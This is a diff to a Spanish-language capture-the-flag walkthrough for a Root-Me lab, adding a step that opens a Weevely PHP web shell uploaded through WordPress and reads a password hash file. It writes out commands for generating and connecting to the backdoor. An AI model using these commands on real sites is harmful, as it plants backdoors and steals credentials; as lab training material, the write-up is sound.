@@ -69,7 +69,7 @@ Agregar nuevo plugin **>** Subir plugin
 
 ![7](https://user-images.githubusercontent.com/75953873/173257639-ce85dec7-fc54-4830-88b4-f040fa379b14.png)
 
-- *Paso 5:* Crear backdoor con weevely.
+- *Paso 5:* Crear backdoor con Weevely.
 ```
 weevely generate pass123 backdoor.php
 ```
@@ -86,3 +86,13 @@ En el apartado de `Media` tenemos archivos e imágenes, el que nos interesa es e
 ![11](https://user-images.githubusercontent.com/75953873/173257849-3f3aa920-9d27-4dd6-88fa-e26396948493.png)
 
 URL: http://ctf14.root-me.org/wp-content/uploads/2022/06/backdoor.php
+
+- *Paso 7:* Acceder al backdoor con Weevely.
+```
+weevely http://ctf14.root-me.org/wp-content/uploads/2022/06/backdoor.php pass123
+```
+![12](https://user-images.githubusercontent.com/75953873/173257930-15d0189a-e1bd-4a23-84df-7b79357ae5f5.png)
+
+Entramos al direcorio `/home` **>** robot **>** `cat` para mostrar el contenido del archivo password.raw-md5.
+
+![13](https://user-images.githubusercontent.com/75953873/173258021-b8bb555d-5578-4f35-a6ed-89c0c0a08a17.png)
